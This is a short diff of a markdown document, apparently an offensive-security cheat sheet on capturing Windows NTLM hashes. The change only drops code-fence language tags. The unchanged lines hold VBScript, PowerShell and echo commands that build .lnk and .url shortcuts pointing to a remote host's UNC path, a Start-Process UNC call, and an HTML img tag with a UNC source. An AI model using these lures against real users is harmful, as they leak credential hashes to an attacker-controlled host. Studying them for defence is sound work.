@@ -237,7 +237,7 @@ IconIndex=1337
 
 We can create a shortcut containing our network path and as you as you open the shortcut Windows will try to resolve the network path. You can also specify a keyboard shortcut to trigger the shortcut. For the icon you can give the name of a Windows binary or choose an icon from either shell32.dll, Ieframe.dll, imageres.dll, pnidui.dll or wmploc.dll located in the system32 directory.
 
-```powershell
+```
 Set shl = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 currentFolder = shl.CurrentDirectory
@@ -254,7 +254,7 @@ sc.Save
 
 The Powershell version.
 
-```powershell
+```
 $objShell = New-Object -ComObject WScript.Shell
 $lnk = $objShell.CreateShortcut("StealMyHashes.lnk")
 $lnk.TargetPath = "\\35.164.153.224\@OsandaMalith"
@@ -269,7 +269,7 @@ $lnk.Save()
 
 Another shortcut in Windows is the Internet shortcuts. You can save this as something.url
 
-```bash
+```
 echo [InternetShortcut] > stealMyHashes.url 
 echo URL=file://192.168.0.1/@OsandaMalith >> stealMyHashes.url
 ```
@@ -301,7 +301,7 @@ Start-Process \\192.168.0.1\aa
 
 IE will resolve UNC paths. For example
 
-```html
+```
 <img src="\\\\192.168.0.1\\aa">
 ```
 
